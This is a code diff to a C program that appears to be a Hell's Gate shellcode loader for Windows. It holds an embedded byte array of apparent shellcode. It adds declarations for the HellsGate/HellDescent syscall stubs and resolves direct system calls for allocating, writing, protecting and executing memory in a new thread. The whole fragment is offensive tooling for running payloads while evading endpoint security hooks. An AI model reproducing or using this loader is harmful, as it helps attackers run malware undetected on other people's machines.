@@ -26,6 +26,10 @@ BYTE buf[] =
 	"\x34\x44\xfa\x06\x52\x33\x2e\x2b\x41\x18\x00\xc8\x9b\xbe"
 	"\x94\x22\x20\x2d\x22\x6f\x24\x39\x24\x41";
 
+//Exported assembly functions
+extern VOID HellsGate(WORD wSystemCall);
+extern HellDescent();
+
 //main function
 int main(int argc, char* argv[])
 {
@@ -89,7 +93,31 @@ int main(int argc, char* argv[])
 
 	if (!GetVxTableEntry(pBase, pImgExportDir, &Table.NtAllocateVirtualMemory))
 	{
-		fprintf(stderr, "[!] Error with GetVxTableEntry...\n");
+		fprintf(stderr, "[!] Error with GetVxTableEntry for NtAllocateVirtualMemory...\n");
+		exit(-1);
+	}
+
+	if (!GetVxTableEntry(pBase, pImgExportDir, &Table.NtCreateThreadEx))
+	{
+		fprintf(stderr, "[!] Error with GetVxTableEntry for NtCreateThreadEx...\n");
+		exit(-1);
+	}
+
+	if (!GetVxTableEntry(pBase, pImgExportDir, &Table.NtWriteVirtualMemory))
+	{
+		fprintf(stderr, "[!] Error with GetVxTableEntry for NtWriteVirtualMemory...\n");
+		exit(-1);
+	}
+
+	if (!GetVxTableEntry(pBase, pImgExportDir, &Table.NtProtectVirtualMemory))
+	{
+		fprintf(stderr, "[!] Error with GetVxTableEntry for NtProtectVirtualMemory...\n");
+		exit(-1);
+	}
+
+	if (!GetVxTableEntry(pBase, pImgExportDir, &Table.NtWaitForSingleObject))
+	{
+		fprintf(stderr, "[!] Error with GetVxTableEntry for NtWaitForSingleObject...\n");
 		exit(-1);
 	}
 
